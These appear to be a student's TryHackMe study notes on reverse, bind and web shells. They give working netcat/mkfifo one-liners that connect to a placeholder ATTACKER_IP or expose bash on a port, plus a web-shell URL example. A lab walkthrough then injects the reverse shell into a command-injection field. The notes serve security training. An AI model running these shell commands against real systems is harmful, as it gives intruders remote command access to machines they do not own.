# Task 3 - Reverse Shell

- Connections initiate from target system to attacker's machine
- Popular tool, netcat
	- Example, nc -lvnp 443

| -l  | listen or wait for connection |
| --- | ----------------------------- |
| -v  | Verbose                       |
| -n  | Prevents DNS lookup           |
| -p  | Indicates port                |

 Pipe reverse shell
 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

| rm -f /tmp/f                            | Removes any existing named pipe file located at /tmp/f/.<br><br>This ensures that the script can create a new named pipe without conflicts.                                                                                             |
| --------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| mkfifo /tmp/f                           | Creates a named pipe, or FIFO (first-in, first-out), at /tmp/f.<br><br>Named pipes allow for two-way communication between processes. Acts as a conduit for input and output.                                                           |
| cat /tmp/f                              | Reads data from the named pipe. It waits for input that can be sent through the pipe.                                                                                                                                                   |
| \| bash -i 2>&1                         | Output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively.<br><br>2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker. |
| \| nc ATTACKER_IP ATTACKER_PORT >/tmp/f | Pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).                                                                                                         |
| >/tmp/f                                 | Sends the output of the commands back into the named pipe, allowing for bi-directional communication.                                                                                                                                   |

Once executed, attacker will receive a reverse shell, can then execute commands like they're logged in

> [!Question]
> **What type of shell allows an attacker to execute commands remotely after the target connects back?**

> [!Success] Answer
> Reverse Shell

> [!Question]
> **What tool is commonly used to set up a listener for a reverse shell?**

> [!Success] Answer
> Netcat

# Task 4 - Bind Shell

- Binds a port on the compromised system to listen for a connection
	- Used when target does not allow for outgoing connections

Bind shell example, used on target machine

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

| rm -f /tmp/f          | Removes any existing named pipe file located at /tmp/f/.<br><br>This ensures that the script can create a new named pipe without conflicts.                                                                         |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| mkfifo /tmp/f         | Creates a named pipe, or FIFO (first-in, first-out), at /tmp/f.<br><br>Named pipes allow for two-way communication between processes. Acts as a conduit for input and output.                                       |
| cat /tmp/f            | Reads data from the named pipe. It waits for input that can be sent through the pipe.                                                                                                                               |
| \| bash -i 2>&1       | Output of cat is piped to a shell instance (bash -i), allows the attacker to execute commands interactively.<br><br>2>&1 redirects standard error to standard output, error messages are sent back to the attacker. |
| \| nc -l 0.0.0.0 8080 | Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.                                                              |
| >/tmp/f               | Sends the output of the commands back into the named pipe, allowing for bi-directional communication.                                                                                                               |

- Listens for incoming connections and expose bash shell
- Attacker can now send a nc command to connect to the target machine
	- Example, `nc -nv TARGET_IP 8080`

> [!Question]
> **What type of shell opens a specific port on the target for incoming connections from the attacker?**

> [!Success] Answer
> Bind Shell

> [!Question]
> **Listening below which port number requires root access or privileged permissions?**

> [!Success] Answer
> 1024

# Task 7 - Web Shell

- File made to support a compromised web server that executes commands through the web server itself
- Can be hidden/hard to find, good for attackers
- Example, code made and sent to server with this,
	![](/img/user/TryHackMe/THM_Images/c9a39b5a05cac5cb5ecbd849c65402db.png)
 - Can be accessed through URLs, attackers can prompt input like, http://victim.com/uploads/shell.php?cmd=whoami
	 - Executes the command and displays result in web browser
# Task 8 - Practical Task

![](/img/user/TryHackMe/THM_Images/4a506eee8d5d2570ef4157888755a1e6.png)

> [!Question]
> **Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?**

Going to the web address gives us this page, with a command line to input commands on

![](/img/user/TryHackMe/THM_Images/4f21dee81659ac09e4b8a1b1807fc0f7.png)

Went to attacker machine (10.10.2.228) and set it up with the following command to listen for all incoming connections on port 443,

```
nc -lvnp 443
```

Used the following command on the website command line to send a connection towards the attacker machine on port 443,

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.2.228 443 >/tmp/f
```
